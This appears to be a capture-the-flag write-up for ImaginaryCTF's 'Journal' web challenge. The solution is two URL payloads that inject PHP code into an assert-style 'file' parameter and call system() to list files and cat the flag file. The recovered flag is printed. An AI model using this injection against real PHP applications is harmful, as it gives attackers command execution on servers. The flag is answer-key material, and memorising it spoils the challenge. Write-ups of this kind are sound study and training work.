# Journal
Solved by **Yappare**

## Question
dear diary, there is no LFI in this app

## Solution
ref: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp \
```http://journal.chal.imaginaryctf.org/?file=%27,%27a%27)%20===%20false%20and%20system(%27ls%27)%20and%20strpos(%27a```

Result shows the flag txt file `flag-cARdaInFg6dD10uWQQgm.txt`

Read it using rce

```http://journal.chal.imaginaryctf.org/?file=%27,%27a%27)%20===%20false%20and%20system(%27cat%20/flag-cARdaInFg6dD10uWQQgm.txt%27)%20and%20strpos(%27a```



### Flag
`ictf{assertion_failed_e3106922feb13b10}`
